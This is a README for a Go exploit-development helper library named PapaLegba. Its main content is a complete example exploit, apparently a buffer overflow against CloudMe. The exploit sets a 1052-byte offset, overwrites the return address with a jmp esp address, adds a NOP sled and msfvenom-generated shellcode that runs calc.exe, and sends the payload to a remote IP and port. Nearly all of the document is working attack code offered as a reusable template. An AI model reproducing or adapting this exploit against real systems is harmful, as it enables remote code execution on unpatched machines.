# PapaLegba
Exploitation dev library written in go
___

Basic exploit dev functions, wrapper for golang's standard libraries to abstract away some of the more cumbersome functions and reduce exploit code length

___
Example Exploit Code:
```
package main

import (
        "fmt"
        "strings"

        "github.com/TerminalJockey/PapaLegba"
)

//offset at 1052
// jmp esp @ 0x68a98a7b
func main() {

        //msfvenom -a x86 -p windows/exec CMD=calc.exe -b '\x00\x0A\x0D' -f c | grep '"' | cut -d '"' -f 2
        shellcode := `\xba\xde\xeb\x7e\x42\xda\xcb\xd9\x74\x24\xf4\x58\x31\xc9\xb1
\x31\x83\xc0\x04\x31\x50\x0f\x03\x50\xd1\x09\x8b\xbe\x05\x4f
\x74\x3f\xd5\x30\xfc\xda\xe4\x70\x9a\xaf\x56\x41\xe8\xe2\x5a
\x2a\xbc\x16\xe9\x5e\x69\x18\x5a\xd4\x4f\x17\x5b\x45\xb3\x36
\xdf\x94\xe0\x98\xde\x56\xf5\xd9\x27\x8a\xf4\x88\xf0\xc0\xab
\x3c\x75\x9c\x77\xb6\xc5\x30\xf0\x2b\x9d\x33\xd1\xfd\x96\x6d
\xf1\xfc\x7b\x06\xb8\xe6\x98\x23\x72\x9c\x6a\xdf\x85\x74\xa3
\x20\x29\xb9\x0c\xd3\x33\xfd\xaa\x0c\x46\xf7\xc9\xb1\x51\xcc
\xb0\x6d\xd7\xd7\x12\xe5\x4f\x3c\xa3\x2a\x09\xb7\xaf\x87\x5d
\x9f\xb3\x16\xb1\xab\xcf\x93\x34\x7c\x46\xe7\x12\x58\x03\xb3
\x3b\xf9\xe9\x12\x43\x19\x52\xca\xe1\x51\x7e\x1f\x98\x3b\x14
\xde\x2e\x46\x5a\xe0\x30\x49\xca\x89\x01\xc2\x85\xce\x9d\x01
\xe2\x21\xd4\x08\x42\xaa\xb1\xd8\xd7\xb7\x41\x37\x1b\xce\xc1
\xb2\xe3\x35\xd9\xb6\xe6\x72\x5d\x2a\x9a\xeb\x08\x4c\x09\x0b
\x19\x2f\xcc\x9f\xc1\x9e\x6b\x18\x63\xdf`

        fmt.Println("cloudme exploit")
        
        //connect to remote process given ip and port
        proc := PapaLegba.ConnectRemProc("192.168.0.46:8888")
        
        offset := strings.Repeat("90", 1052)
        offset = PapaLegba.StrToHex(offset)
        
        //overwrite EIP and convert to hex
        overwrite := PapaLegba.StrToHex("68a98a7b")
        //invert byte order to handle endianness
        overwrite = PapaLegba.InvertEndian(overwrite)
        
        //create nops and convert to usable format
        nops := PapaLegba.StrToHex(strings.Repeat("90", 30))
        
        //strips \x and newlines from shellcode
        shellcode = PapaLegba.FormatShellcode(shellcode)
        //converts shellcode to usable format
        shellcode = PapaLegba.StrToHex(shellcode)
        
        //generate after padding
        after := strings.Repeat("A", 200)
        payload := offset + overwrite + nops + shellcode + after
        
        //fire the missiles!
        PapaLegba.SendRemArg(proc, payload)
}
```
